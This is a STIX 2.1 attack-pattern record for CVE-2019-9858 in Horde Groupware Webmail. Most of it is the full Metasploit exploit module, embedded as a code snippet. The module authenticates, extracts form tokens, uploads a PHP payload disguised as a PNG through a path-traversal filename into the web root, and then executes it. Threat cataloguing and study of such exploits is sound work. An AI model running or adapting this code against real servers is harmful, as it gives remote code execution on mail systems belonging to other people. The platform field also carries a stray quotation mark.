{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c97ce4e3-2643-4a82-85e1-373776f1f3ec",
    "created": "2024-08-14T17:10:11.086433Z",
    "modified": "2024-08-14T17:10:11.086438Z",
    "name": "Horde Form File Upload Vulnerability",
    "description": " Horde Groupware Webmail contains a flaw that allows an authenticated remote attacker to execute arbitrary PHP code. The exploitation requires the Turba subcomponent to be installed.  This module was tested on Horde versions 5.2.22 and 5.2.17 running Horde Form subcomponent < 2.0.19.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/horde_form_file_upload.rb",
            "external_id": "horde_form_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-9858"
        },
        {
            "source_name": "reference",
            "url": "https://www.ratiosec.com/2019/horde-groupware-webmail-authenticated-arbitrary-file-injection-to-rce/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'Horde Form File Upload Vulnerability',\n      'Description'     => %q{\n          Horde Groupware Webmail contains a flaw that allows an authenticated remote\n          attacker to execute arbitrary PHP code. The exploitation requires the Turba\n          subcomponent to be installed.\n\n          This module was tested on Horde versions 5.2.22 and 5.2.17 running Horde Form subcomponent < 2.0.19.\n        },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Ratiosec',\n        ],\n      'References'      =>\n        [\n          ['CVE', '2019-9858'],\n          ['URL', 'https://www.ratiosec.com/2019/horde-groupware-webmail-authenticated-arbitrary-file-injection-to-rce/'],\n        ],\n      'DisclosureDate'  => '2019-03-24',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         =>\n        [\n          ['Automatic', { }],\n        ],\n      'DefaultTarget'   => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('TARGETURI',  [true, 'The base path to the web application', '/']),\n        OptString.new('USERNAME',   [true, 'The username to authenticate with']),\n        OptString.new('PASSWORD',   [true, 'The password to authenticate with']),\n        OptString.new('WEB_ROOT',   [true, 'Path to the web root', '/var/www/html'])\n        # Appears to be '/usr/share/horde/' if installed with apt\n      ])\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def webroot\n    datastore['WEB_ROOT']\n  end\n\n  def horde_login(user, pass)\n    res = send_request_cgi(\n      'method'      => 'GET',\n      'uri'         => normalize_uri(target_uri, 'login.php')\n    )\n\n    fail_with(Failure::Unreachable, 'No response received from the target.') unless res\n\n    session_cookie = res.get_cookies\n    vprint_status(\"Logging in...\")\n    res = send_request_cgi(\n      'method'      => 'POST',\n      'uri'         => normalize_uri(target_uri, 'login.php'),\n      'cookie'      => session_cookie,\n      'vars_post'   => {\n        'horde_user'  => user,\n        'horde_pass'  => pass,\n        'login_post'    => '1'\n      }\n    )\n\n    return res.get_cookies if res && res.code == 302\n    []\n  end\n\n  def get_tokens(cookie)\n    res = send_request_cgi(\n      'method'      => 'GET',\n      'uri'         => normalize_uri(target_uri, 'turba', 'add.php'),\n      'cookie'      => cookie\n    )\n\n    if res && res.code == 200\n      source_tokens = res.body.scan(/turba\\/add\\.php\\?source=(.+)\"/).flatten\n      unless source_tokens.empty?\n        form_tokens = res.body.scan(/name=\"turba_form_addcontact_formToken\" value=\"(.+)\"/).flatten\n        return source_tokens[0], form_tokens[0], res.get_cookies\n      end\n    end\n    nil\n  end\n\n  def exploit\n    vprint_status(\"Authenticating using #{username}:#{password}\")\n\n    cookie = horde_login(username, password)\n    fail_with(Failure::NoAccess, 'Unable to login. Verify USERNAME/PASSWORD or TARGETURI.') if cookie.nil? || cookie.empty?\n    vprint_good(\"Authenticated to Horde.\")\n\n    tokens = get_tokens(cookie)\n    fail_with(Failure::Unknown, 'Error extracting tokens.') if tokens.nil?\n    source_token, form_token, secret_cookie = tokens\n\n    vprint_good(\"Tokens \\\"#{source_token}\\\", \\\"#{form_token}\\\", and cookie \\\"#{secret_cookie}\\\" found.\")\n\n    payload_name = Rex::Text.rand_text_alpha_lower(10..12)\n    payload_path = File.join(webroot, \"static\", \"#{payload_name}.php\")\n    payload_path_traversal = File.join(\"..\", payload_path)\n\n    data = Rex::MIME::Message.new\n    data.add_part(payload.encoded, 'image/png', nil, \"form-data; name=\\\"object[photo][new]\\\"; filename=\\\"#{payload_name}.png\\\"\")\n    data.add_part(\"turba_form_addcontact\", nil, nil, 'form-data; name=\"formname\"')\n    data.add_part(form_token, nil, nil, 'form-data; name=\"turba_form_addcontact_formToken\"')\n    data.add_part(source_token, nil, nil, 'form-data; name=\"source\"')\n    data.add_part(payload_path_traversal, nil, nil, 'form-data; name=\"object[photo][img][file]\"')\n    post_data = data.to_s\n\n    print_status(\"Uploading payload to #{payload_path_traversal}\")\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri, 'turba', 'add.php'),\n      'ctype'     => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'      => post_data,\n      'cookie'    => cookie + ' ' + secret_cookie\n    )\n\n    fail_with(Failure::Unknown, \"Unable to upload payload to #{payload_path_traversal}.\") unless res && res.code == 200\n\n    payload_url = normalize_uri(target_uri, 'static', \"#{payload_name}.php\")\n\n    vprint_status(\"Executing the payload at #{payload_url}.\")\n    res = send_request_cgi(\n        'uri'     => payload_url,\n        'method'  => 'GET',\n    )\n\n    register_files_for_cleanup(payload_path)\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-03-24",
    "x_mitre_platforms": [
        "php'"
    ]
}